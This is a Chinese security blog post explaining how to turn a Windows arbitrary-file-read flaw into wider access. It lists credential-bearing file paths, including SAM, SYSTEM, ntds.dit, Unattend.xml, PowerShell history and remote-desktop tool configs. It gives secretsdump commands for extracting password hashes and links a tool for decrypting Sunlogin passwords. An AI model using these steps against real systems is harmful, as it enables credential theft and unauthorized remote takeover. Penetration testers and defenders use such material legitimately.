> **原文链接**: https://mp.weixin.qq.com/s?__biz=Mzg5MDA5NzUzNA==&mid=2247489440&idx=1&sn=52e46ab1d65d62e5eca08cc8076fb77c

#  Windows 任意文件读取漏洞如何扩大战果？  
 藏剑安全   2025-07-21 01:31  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4nXTKcMNvDAEXiceibEJfeibc5vYVq6g6SOyj19zpUQM9Jxa2bByQjXPXiaNsmx8zYhYTJvartCEVATXYXibwbKwiaJw/640?from=appmsg "")  
  
.  
  
.  
  
.  
  
.  
  
.  
  
前言  
  
.  
  
.  
  
.  
  
.  
  
.  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/mFOgxUsUkK6icf3ibrBMuZZq63JMOC01a9fmliam6Cn8ahdibjl5p0nicS5wGMic1lQxjO1K5ibaQByhNdW2DjulfhdIg/640?from=appmsg "")  
  
  
内 x 通，这么多年一直存在的洞，闲下来研究了一下，怎么通过任意文件读取漏洞去扩大战果，如有错误，欢迎指出。  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/4nXTKcMNvDAEXiceibEJfeibc5vYVq6g6SOyj19zpUQM9Jxa2bByQjXPXiaNsmx8zYhYTJvartCEVATXYXibwbKwiaJw/640?from=appmsg "")  
  
.  
  
.  
  
.  
  
.  
  
.  
  
扩大战果  
  
.  
  
.  
  
.  
  
.  
  
.  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/mFOgxUsUkK6icf3ibrBMuZZq63JMOC01a9fmliam6Cn8ahdibjl5p0nicS5wGMic1lQxjO1K5ibaQByhNdW2DjulfhdIg/640?from=appmsg "")  
  
  
1.hosts 文件  
  

```
C:\Windows\System32\drivers\etc\hosts
```

  
  
2.PowerShell 命令历史  

```
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

  
3.cmd日志  

```
C:\Windows\System32\winevt\Logs\Microsoft-Windows-CommandProcessor%4Operational.evtx 
```

  
同时，这个路径下有很多日志文件  

```
C:\Windows\System32\winevt\Logs\
```

  
下载后使用Event Viewer或者LogParser读取.evtx文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/H7ec9FOh7vr1QzjDwFibicHt6L7YvdAh6pvwmUibJUbyVb3qRmq2bJuEPibwfF3r7lhnLMBxzK4TAPGEAgQ6BzhhJQ/640?wx_fmt=png&from=appmsg "")  
  
4.可能存在 Windows应答文件  

```
C:\\Windows\\Panther\\Unattend.xml
```

  
这个文件是 Windows 系统安装或部署过程中使用的无人值守应答文件，包含诸如用户名、计算机名、产品密钥、网络设置等自动化配置。系统安装时会自动读取该文件，以实现无需人工干预的自动化安装或系统初始化  
  
很小的概率有，但是值得一试，里面可能有密码文件  
  
5.SAM 文件  
  
需要 system 权限  

```
C:\Windows\System32\config\SAM
```


```
C:\\Windows\\System32\\config\\SYSTEM
```


```
读hash
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

  
可以拿impacket 套件中的secretsdump 提取hash，然后拿来破解hash，如果能跑出来密码，并且开放 rdp，可以爽歪歪，也可以 hash 喷洒  
  
6.如果有 Web 端，读源码之类的审计  
  
这个可以通过猜路径或者尝试抛出报错  
  
  
7.数据库配置文件  

```
C:\Windows\my.ini
```

  
分为两个，如果有网站路径，可以尝试碰撞一下 config文件，例如 config.php，里面会记录一些数据库账号密码  
  
  
8.web.config  
  
可能有一些数据库配置信息，需要根据网站路径动态调整  
  
  
9.一些配置文件  
  
例如  
  
C:\Windows\my.ini  
  
10.尝试爆一下 nginx 配置文件  
  
现在很多网站都设置了一些二级目录三级目录，使用 nginx 进行反代，如果可以读到 nginx 文件，可以进一步扩大攻击面。  
  
11.常用文件名  
  
桌面，可以收集一下常用文件名，例如"DMZ.xlsx"、"密码.txt"  
  
12.域控读取所有用户 hash  

```
C:\Windows\NTDS\ntds.dit
C:\Windows\System32\config\SYSTEM
python secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL
```

  
ntds.dit 中的 hash 被加密，需要 SYSTEM 文件中包含的 BootKey 来解密  
  
如果目标机器是域控机器的话，可以读取所有用户的 Hash。  
  
13.远控工具低版本 config文件  
  
例如，向日葵，ToDesk 等  
  
向日葵安装版  

```
C:\Program Files\Oray\SunLogin\SunloginClient\config.ini
```

  
向日葵便携版  

```
C:\ProgramData\Oray\SunloginClient\config.ini
```

  
读取后配合 Github 上工具  
  
https://github.com/wafinfo/Sunflower_get_Password  
  
进行提取，然后找个客户端直接远控  
  
  
ToDesk安装版  

```
C:\Program Files\ToDesk\config.ini
```

  
Todesk便携版  

```
C:\ProgramData\ToDesk\config.ini
```

  
具体参考文章  

```
https://blog.csdn.net/2301_80520893/article/details/136021349
```

  
  
如果还有的话，欢迎留言区补充  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**推荐阅读**  
  
**内推|长亭科技2025届秋招开启，附内推码~**  
  
  
**你能拿她学校的shell，但永远拿不了她的shell******  
  
  
**渗透实战|记一次简单的Docker逃逸+反编译jar接管云主机**  
  
  
  
**渗透实战|NPS反制之绕过登陆验证**  
  
  
**渗透实战|记一次曲折的EDU通杀漏洞挖掘**  
  
  
**渗透实战|记一次RCE+heapdump信息泄露引发的血案**  
  
  
**免责声明**  
  
由于传播、利用本公众号**藏剑安全**  
所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号**藏剑安全**  
及作者不为**此**  
承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！  
  
好文分享收藏赞一下最美点在看哦  
  
  
  
